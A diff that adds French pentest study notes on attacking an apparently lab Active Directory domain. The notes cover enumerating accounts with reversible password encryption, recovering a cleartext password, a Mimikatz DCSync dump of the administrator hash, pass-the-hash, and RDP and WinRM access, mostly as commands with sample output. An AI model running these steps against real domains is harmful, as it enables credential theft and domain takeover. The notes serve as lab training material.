@@ -3719,6 +3719,127 @@ hashcat -m 1000 inlanefreight_hashes.ntds /usr/share/wordlists/rockyou.txt --for
 ✔️ On a vu comment exploiter les hashs NTLM avec Pass-the-Hash et Hashcat 🚀
 
 🔥 Avec ces informations, on peut prendre le contrôle total d'Active Directory ! 🔥
+
+
+Voici la suite des notes en français avec des émoticônes pour rendre l'explication plus claire.
+
+🔎 Énumération avancée avec Get-ADUser et extraction des mots de passe réversibles
+Nous avons maintenant accès à l'Active Directory et nous allons énumérer les comptes pour identifier ceux qui ont des configurations sensibles.
+
+🛠️ 1. Identification des comptes avec chiffrement réversible
+Nous utilisons Get-ADUser pour rechercher les comptes qui ont l'option de chiffrement réversible activée 🔐.
+
+Commande PowerShell :
+```powershell
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+```
+💡 Explication des paramètres :
+✔️ -Filter 'userAccountControl -band 128' → Recherche les comptes ayant le chiffrement réversible activé.
+✔️ -Properties userAccountControl → Affiche les paramètres avancés du compte.
+
+Exemple de sortie :
+
+```yaml
+DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+Enabled            : True
+SamAccountName     : proxyagent
+userAccountControl : 640
+```
+📌 Le compte proxyagent a l'option de chiffrement réversible activée !
+
+🔍 2. Vérification avec PowerView (Get-DomainUser)
+Nous pouvons aussi utiliser PowerView pour vérifier cette option avec Get-DomainUser 📡.
+
+Commande PowerShell :
+```powershell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
+```
+✔️ Cette commande liste tous les comptes avec l'option de mot de passe réversible.
+
+Sortie :
+
+```diff
+samaccountname                         useraccountcontrol
+--------------                         ------------------
+proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
+```
+📌 Cela confirme que le compte proxyagent stocke son mot de passe en clair 🔓
+
+🔑 3. Récupération du mot de passe en clair
+✔️ Nous avons déjà extrait un mot de passe en clair lors de l'exécution de secretsdump.py :
+
+```bash
+cat inlanefreight_hashes.ntds.cleartext
+````
+Sortie :
+
+```makefile
+proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
+```
+🔥 Ce compte peut maintenant être utilisé pour une connexion directe ! 🔥
+
+🎭 4. Exploitation avec Mimikatz
+Nous pouvons aussi récupérer les hash NTLM et mots de passe avec Mimikatz 🛠️.
+
+💻 Étape 1 : Exécuter PowerShell avec les droits DCSync
+```powershell
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+```
+💡 Cela lance PowerShell avec les droits de réplication de adunn.
+
+💻 Étape 2 : Lancer Mimikatz
+Dans le nouveau terminal PowerShell, exécuter :
+
+```powershell
+.\mimikatz.exe
+```
+✔️ Activer les privilèges :
+
+```powershell
+privilege::debug
+```
+✔️ Lancer l'attaque DCSync :
+
+```powershell
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+```
+Sortie :
+
+```yaml
+SAM Username         : administrator
+Hash NTLM: 88ad09182de639ccc6579eb0849751cf
+```
+📌 Nous avons récupéré le hash NTLM de administrator !
+
+🚀 5. Exploitation des accès à distance
+Nous pouvons maintenant utiliser plusieurs méthodes pour exploiter ces comptes 🔥 :
+
+🔓 1. Pass-the-Hash avec Mimikatz
+```powershell
+sekurlsa::pth /user:Administrator /domain:INLANEFREIGHT.LOCAL /ntlm:88ad09182de639ccc6579eb0849751cf
+```
+✔️ Connexion sans mot de passe directement avec le hash NTLM !
+
+💻 2. Accès via RDP
+Si le compte a des droits d’administration, on peut se connecter via Remote Desktop (RDP) :
+
+```powershell
+mstsc /admin /v:172.16.5.5
+```
+✔️ Entrer le mot de passe Pr0xy_ILFREIGHT! (ou utiliser Pass-the-Hash).
+
+📡 3. Accès via WinRM (PowerShell Remoting)
+Si WinRM est activé :
+
+```powershell
+Enter-PSSession -ComputerName 172.16.5.5 -Credential INLANEFREIGHT\proxyagent
+```
+📢 Résumé rapide
+✔️ On a énuméré les comptes Active Directory pour identifier ceux avec chiffrement réversible.
+✔️ On a récupéré un mot de passe en clair (proxyagent:Pr0xy_ILFREIGHT!).
+✔️ On a exploité Mimikatz pour récupérer les hash NTLM et lancer Pass-the-Hash.
+✔️ On a testé plusieurs méthodes d’accès à distance (RDP, WinRM, Pass-the-Hash).
+
 ## Stacking The Deck
 
 ## Why So Trusting?
